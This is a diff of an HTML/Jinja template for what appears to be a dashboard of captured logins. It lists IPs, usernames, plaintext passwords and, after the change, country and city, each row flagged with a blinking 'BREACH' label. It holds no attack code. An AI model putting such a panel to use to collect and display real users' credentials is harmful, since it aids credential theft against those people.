@@ -82,27 +82,44 @@
         > Status: <span class="blink">ACTIVE</span>
     </div>
 
-    <table>
-        <tr>
-            <th>ID</th>
-            <th>IP</th>
-            <th>USERNAME</th>
-            <th>PASSWORD</th>
-            <th>TIME</th>
-            <th>STATUS</th>
-        </tr>
+   <table>
+    <tr>
+        <th>ID</th>
+        <th>IP</th>
+        <th>Username</th>
+        <th>Password</th>
+        <th>Country</th>
+        <th>City</th>
+        <th>Time</th>
+        <th>Status</th>
+    </tr>
 
-        {% for row in data %}
-        <tr>
-            <td>{{ row[0] }}</td>
-            <td class="ip">{{ row[1] }}</td>
-            <td>{{ row[2] }}</td>
-            <td>{{ row[3] }}</td>
-            <td>{{ row[4] }}</td>
-            <td class="attack">⚠ BREACH</td>
-        </tr>
-        {% endfor %}
-    </table>
+    {% for row in data %}
+    <tr>
+        <td>{{ row[0] }}</td>
+
+        <td class="ip">{{ row[1] }}</td>
+
+        <td>{{ row[2] }}</td>
+
+        <td style="color:#ff4444;">
+            {{ row[3] }}
+        </td>
+
+        <td>
+            {{ row[4] if row[4] != "Unknown" else "🌐 Hidden" }}
+        </td>
+
+        <td>
+            {{ row[5] if row[5] != "Unknown" else "🌐 Hidden" }}
+        </td>
+
+        <td>{{ row[6] }}</td>
+
+        <td class="attack blink">⚠ BREACH</td>
+    </tr>
+    {% endfor %}
+</table>
 
 </div>
 
